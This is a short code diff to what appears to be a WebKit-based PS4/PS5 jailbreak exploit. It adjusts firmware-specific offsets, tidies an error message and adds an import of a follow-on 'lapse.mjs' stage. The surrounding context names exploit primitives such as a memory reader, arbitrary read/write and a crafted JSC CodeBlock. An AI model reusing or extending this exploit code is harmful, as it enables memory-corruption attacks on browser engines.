@@ -72,22 +72,18 @@ const [is_ps4, version] = (() => {
 })();
 
 const ssv_len = (() => {
-    // All supported PS5 versions
-    if (!is_ps4) {
+    if (0x600 <= config.target && config.target < 0x650) {
+        return 0x58;
+    }
+
+    // PS4 9.xx and all supported PS5 versions
+    if (config.target >= 0x900) {
         return 0x50;
     }
 
-    // PS4
-    if (0x600 <= version && version < 0x650) {
-        return 0x58;
-    }
-    if (0x650 <= version && version < 0x900) {
+    if (0x650 <= config.target && config.target < 0x900) {
         return 0x48;
     }
-    if (0x900 <= version) {
-        return 0x50;
-    }
-    throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? '4' : '5'}, version: ${hex(version)}`);
 })();
 
 // these constants are expected to be divisible by 2
@@ -458,7 +454,7 @@ async function make_rdr(view) {
         log(`view's buffer address: ${addr}`);
         return new Reader(rstr, view);
     }
-    die('JSString wasn\'t modified');
+    die("JSString wasn't modified");
 }
 
 // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
@@ -860,6 +856,7 @@ async function main() {
     await make_arw(rdr, view2, pop);
 
     clear_log();
+    // path to your script that will use the exploit
     import('./lapse.mjs');
 }
 main();
